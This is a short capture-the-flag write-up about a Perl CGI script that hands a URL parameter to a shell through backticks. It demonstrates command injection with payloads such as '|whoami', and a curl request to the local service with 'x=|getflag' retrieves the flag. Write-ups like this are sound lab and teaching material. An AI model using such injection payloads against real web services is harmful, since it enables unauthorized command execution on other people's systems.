we have a simple perl script :

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print \`echo $y 2>&1\`;
}
x(param("x"));
```

the backtick is a perl syntax to execute shell code, so here it's executing `echo $y` in shell.
the exploit is that we can modify $y.
`./level04 x=test` :

```
Content-type: text/html

test
```

so `./level04 'x=|whoami'` : `level04`. it should be flag04 since the setuid flag is set and the owner is flag04, but perl as a security measure against thoses kinds of attacks, and even if the setuid it set subshell command in backtick will be executed by the launcher of the file.

the `# localhost:4747` command and the fact that the CGI plugin is related to http can make us guess that this script is available at localhost:4747, and that it may run as flag04.
`curl 'localhost:4747?x=|getflag'` give us the flag.
